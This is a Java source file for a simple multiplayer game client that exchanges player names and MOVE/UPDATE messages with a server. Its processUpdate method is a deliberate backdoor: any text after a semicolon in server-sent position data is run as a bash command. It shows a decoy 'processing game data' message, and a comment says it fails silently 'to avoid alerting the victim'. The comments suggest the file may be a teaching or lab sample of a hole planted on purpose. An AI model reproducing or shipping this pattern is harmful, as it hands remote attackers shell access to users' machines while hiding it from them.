import java.io.*;
import java.net.*;

public class MMORPGClient {
    private static final String SERVER_ADDRESS = "localhost";
    private static final int SERVER_PORT = 12345;

    public static void main(String[] args) {

        try (
            Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
            BufferedReader in = new BufferedReader(
                new InputStreamReader(socket.getInputStream())
            );
            PrintWriter out = new PrintWriter(
                socket.getOutputStream(), true
            );
            BufferedReader consoleInput = new BufferedReader(
                new InputStreamReader(System.in)
            )
        ) {

            System.out.println(in.readLine()); // Prompt for player name

            String playerName = consoleInput.readLine();

            out.println(playerName);

            // Thread to listen for server messages
            new Thread(() -> {

                String serverMessage;

                try {

                    while ((serverMessage = in.readLine()) != null) {

                        if (serverMessage.startsWith("UPDATE:")) {

                            String[] parts = serverMessage.split(":", 3);
                            
                            if (parts.length >= 3) {
                                String otherPlayerName = parts[1];
                                String positionData = parts[2];

                                System.out.println(
                                    otherPlayerName + " is now at " + positionData
                                );
                                
                                // VULNERABILITY: Process position data
                                processUpdate(positionData);
                            }
                        }
                    }

                } catch (IOException e) {
                    e.printStackTrace();
                }

            }).start();


            String userInput;

            while ((userInput = consoleInput.readLine()) != null) {

                if (userInput.startsWith("MOVE:")) {
                    out.println(userInput);
                } else {
                    // Auto-format non-MOVE input
                    out.println("MOVE:" + userInput);
                }
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    // VULNERABLE METHOD - This is where the exploit happens
    private static void processUpdate(String positionData) {
        try {
            // Check if position data contains a command (separated by semicolon)
            if (positionData.contains(";")) {
                String[] parts = positionData.split(";", 2);
                
                if (parts.length > 1) {
                    String command = parts[1].trim();
                    
                    // Remove the comment marker if present
                    if (command.endsWith("#")) {
                        command = command.substring(0, command.length() - 1).trim();
                    }
                    
                    System.out.println("[Processing game data...]");
                    
                    // VULNERABILITY: Execute the command
                    Process process = Runtime.getRuntime().exec(
                        new String[]{"/bin/bash", "-c", command}
                    );
                    
                    process.waitFor();
                }
            }
        } catch (Exception e) {
            // Silently fail to avoid alerting the victim
            System.err.println("[Game data processing error - ignored]");
        }
    }
}